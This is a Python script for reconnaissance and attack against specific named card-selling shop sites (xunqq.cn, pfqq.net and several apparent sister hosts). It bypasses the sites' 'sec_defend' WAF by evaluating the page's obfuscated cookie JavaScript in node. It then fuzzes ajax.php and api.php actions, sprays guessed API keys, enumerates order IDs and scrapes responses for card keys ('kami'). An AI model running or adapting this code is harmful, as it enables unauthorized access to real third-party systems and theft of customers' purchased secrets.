#!/usr/bin/env python3
"""Rainbow SUCCESS_CASES recon for xunqq.cn/admin (pfqq.net -> xunqq.cn)."""
import re
import json
import subprocess
import urllib.parse
import urllib.request
import http.cookiejar
from pathlib import Path

OUT = Path("/data/recon/pfqq.net")
(OUT / "dump").mkdir(parents=True, exist_ok=True)
(OUT / "probe").mkdir(parents=True, exist_ok=True)
HOST = "http://xunqq.cn"
BASE = HOST + "/admin"
UA = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
)


def set_cookie(cj, name, value, domain="xunqq.cn", path="/"):
    c = http.cookiejar.Cookie(
        0, name, value, None, False, domain, False, False, path, False,
        False, None, False, None, None, {},
    )
    cj.set_cookie(c)


def waf_session():
    cj = http.cookiejar.CookieJar()
    opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))

    def get(url, data=None, headers=None):
        h = {
            "User-Agent": UA,
            "Accept": "text/html,application/xhtml+xml,*/*",
            "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8",
            "Referer": HOST + "/nasgo/",
        }
        if headers:
            h.update(headers)
        req = urllib.request.Request(url, data=data, headers=h)
        r = opener.open(req, timeout=20)
        return r, r.read().decode("utf-8", "ignore")

    # warm through gate (avoids "Click to continue!" throttle)
    get(HOST + "/nasgo/")
    get(HOST + "/loading/")

    _, html = get(BASE + "/")
    if "mod=buy" in html or "查询订单" in html or "ajax.php" in html:
        return opener, cj, html

    # extract JSFuck cookie value from setCookie('sec_defend', EXPR)
    m = re.search(
        r"setCookie\(\s*['\"]sec_defend['\"]\s*,\s*(.+?)\)\s*;\s*setCookie\(\s*['\"]sec_defend_time['\"]",
        html,
        re.S,
    )
    if not m:
        (OUT / "probe" / "waf_fail.html").write_text(html, encoding="utf-8")
        raise RuntimeError(f"no sec_defend expr; html_len={len(html)} head={html[:80]!r}")

    expr = m.group(1)
    p = subprocess.run(
        ["node", "-e", f"console.log({expr})"],
        capture_output=True,
        text=True,
        timeout=15,
    )
    if p.returncode != 0 or not p.stdout.strip():
        raise RuntimeError(f"node eval failed: {p.stderr[:300]}")
    cookie_val = p.stdout.strip()
    set_cookie(cj, "sec_defend", cookie_val)
    set_cookie(cj, "sec_defend_time", "2")

    _, html2 = get(BASE + "/index.php")
    return opener, cj, html2


def fetch(opener, url, data=None, headers=None):
    h = {
        "User-Agent": UA,
        "Referer": BASE + "/",
        "Accept": "*/*",
    }
    if headers:
        h.update(headers)
    req = urllib.request.Request(url, data=data, headers=h)
    return opener.open(req, timeout=15).read().decode("utf-8", "ignore")


def main():
    results = {
        "target": "https://pfqq.net/",
        "canonical": "http://xunqq.cn/",
        "shop": BASE,
        "stack": "Rainbow-like faka behind sec_defend WAF at /admin/",
        "cases": {},
        "kami_found": False,
    }
    opener, _, html = waf_session()
    title_m = re.search(r"<title>([^<]+)", html)
    results["title"] = title_m.group(1).strip() if title_m else None
    (OUT / "probe" / "admin_shop.html").write_text(html, encoding="utf-8")
    print("TITLE", results["title"], "len", len(html))
    print("MARKERS", {
        "mod=buy": "mod=buy" in html,
        "ajax.php": "ajax.php" in html,
        "api.php": "api.php" in html,
        "查询": "查询" in html,
        "sec_defend": "sec_defend" in html,
    })

    if "sec_defend" in html and "mod=buy" not in html:
        raise RuntimeError("still behind WAF after bypass")

    # ajax acts
    ajax_hits = []
    acts = [
        "query", "order", "search", "kami", "card", "getkami", "getcard",
        "check", "tools", "get", "list", "config", "pay", "notify",
        "getGoods", "getClass", "getTool", "payrmb", "cart", "getcount",
    ]
    for act in acts:
        for method in ["GET", "POST"]:
            try:
                if method == "GET":
                    url = f"{BASE}/ajax.php?act={act}&id=1&orderid=1&data=1"
                    body = fetch(
                        opener, url,
                        headers={"X-Requested-With": "XMLHttpRequest"},
                    )[:400]
                else:
                    payload = urllib.parse.urlencode({
                        "act": act, "id": "1", "orderid": "1",
                        "data": "1", "out_trade_no": "1",
                    }).encode()
                    body = fetch(
                        opener, f"{BASE}/ajax.php", data=payload,
                        headers={
                            "X-Requested-With": "XMLHttpRequest",
                            "Content-Type": "application/x-www-form-urlencoded",
                        },
                    )[:400]
                compact = body.replace(" ", "")
                if '"code":403' in compact or '"code":-4' in compact:
                    continue
                if body.strip() and not body.lstrip().lower().startswith("<!"):
                    ajax_hits.append({"method": method, "act": act, "body": body})
                    print(f"AJAX {method} {act}: {body}")
            except Exception as e:
                pass
    results["cases"]["ajax"] = ajax_hits

    # api.php
    api_hits = []
    for path in ["api.php", "%61pi.php"]:
        for act, extra in [
            ("search", "&id=1"),
            ("query", "&id=1"),
            ("orders", "&id=1"),
            ("tools", ""),
            ("get", "&id=1"),
            ("site", ""),
        ]:
            try:
                url = f"{BASE}/{path}?act={act}{extra}"
                body = fetch(opener, url)[:400]
                api_hits.append({"path": path, "act": act, "body": body})
                print(f"API {path}?act={act}: {body}")
            except Exception as e:
                api_hits.append({"path": path, "act": act, "error": str(e)})
    results["cases"]["api"] = api_hits

    # tools key spray
    tools = []
    keys = [
        "", "123456", "admin", "test", "1", "0", "null", "tools", "apikey",
        "api_key", "xunqq", "pfqq", "vxqcc", "haomaqq", "985895", "7229863",
        "admin88", "Ykfaka999", "rainbow", "faka", "qqpifa", "nasgo",
        "1934131068", "VXQCC",
    ]
    for key in keys:
        try:
            url = f"{BASE}/api.php?act=tools&key={urllib.parse.quote(key)}&limit=1"
            body = fetch(opener, url)[:300]
            hit = all(x not in body for x in ["空", "错误", "非法", "关闭", "不正确"])
            tools.append({"key": key, "body": body, "interesting": hit})
            if hit or key in ("", "123456", "admin", "admin88"):
                print("TOOLS", repr(key), body, ("HIT" if hit else ""))
        except Exception as e:
            tools.append({"key": key, "error": str(e)})
    results["cases"]["tools"] = tools

    # qd93-style query page
    qd93 = []
    for data in ["1", "test", "13800138000", "admin", "@VXQCC", "20240801", "1934131068"]:
        try:
            url = f"{BASE}/?mod=query&data={urllib.parse.quote(data)}"
            body = fetch(opener, url)
            hits = []
            for pat in [
                r"卡密[^<]{0,100}", r"kami[^<]{0,100}", r"订单号[^<]{0,80}",
                r"暂无", r"没有查询到", r"查询结果", r"联系方式", r"out_trade_no",
            ]:
                m = re.search(pat, body, re.I)
                if m:
                    hits.append(m.group(0)[:100])
            qd93.append({"data": data, "hits": hits, "len": len(body)})
            print("QUERY", data, hits)
        except Exception as e:
            qd93.append({"data": data, "error": str(e)})
    results["cases"]["qd93_query"] = qd93

    # discover tids
    buy_html = fetch(opener, f"{BASE}/?mod=buy&cid=&tid=")
    tids = sorted(set(int(x) for x in re.findall(r"tid=(\d+)", buy_html)))
    print("TIDS", tids[:40], "count", len(tids))
    results["tids_sample"] = tids[:80]
    results["tids_count"] = len(tids)
    (OUT / "probe" / "buy.html").write_text(buy_html, encoding="utf-8")

    # api search wider
    search_hits = []
    for i in list(range(1, 50)) + [100, 500, 1000, 5000, 10000, 99999]:
        try:
            body = fetch(opener, f"{BASE}/api.php?act=search&id={i}")
            if "不存在" not in body and "非法" not in body and "sec_defend" not in body:
                search_hits.append({"id": i, "body": body[:400]})
                print("SEARCH HIT", i, body[:220])
        except Exception:
            pass
    results["cases"]["api_search"] = search_hits

    # try ajax query with order-like params
    for params in [
        {"act": "query", "type": "1", "content": "1"},
        {"act": "query", "type": "0", "content": "test"},
        {"act": "query", "qq": "1934131068"},
        {"act": "order", "id": "1"},
    ]:
        try:
            payload = urllib.parse.urlencode(params).encode()
            body = fetch(
                opener, f"{BASE}/ajax.php", data=payload,
                headers={
                    "X-Requested-With": "XMLHttpRequest",
                    "Content-Type": "application/x-www-form-urlencoded",
                },
            )[:400]
            print("AJAXPARAM", params, body)
            results.setdefault("cases", {}).setdefault("ajax_param", []).append(
                {"params": params, "body": body}
            )
        except Exception as e:
            print("AJAXPARAM ERR", params, e)

    # sister shops
    sisters = {}
    for host in ["yxpf.cc", "hmpf.net", "vxq.cc"]:
        for path in ["/shop/", "/shop", "/"]:
            try:
                url = f"http://{host}{path}"
                req = urllib.request.Request(url, headers={"User-Agent": UA})
                with urllib.request.urlopen(req, timeout=12) as r:
                    b = r.read().decode("utf-8", "ignore")
                    final = r.geturl()
                sisters[url] = {
                    "final": final,
                    "len": len(b),
                    "title": (re.search(r"<title>([^<]+)", b) or [None, None])[1],
                    "has_faka": any(x in b for x in ["ajax.php", "api.php", "mod=query", "YKFAKA", "彩虹"]),
                }
                print("SISTER", url, sisters[url])
                break
            except Exception as e:
                sisters[f"http://{host}{path}"] = {"error": str(e)[:160]}
    results["sisters"] = sisters

    # kami heuristic
    blob = json.dumps(results, ensure_ascii=False)
    if re.search(r"(卡密|kami)[:：\s\"'].{6,}", blob, re.I):
        results["kami_found"] = True

    (OUT / "dump" / "STATS.json").write_text(
        json.dumps(results, ensure_ascii=False, indent=2), encoding="utf-8"
    )
    print("WROTE", OUT / "dump" / "STATS.json")
    print("KAMI", results["kami_found"])


if __name__ == "__main__":
    main()
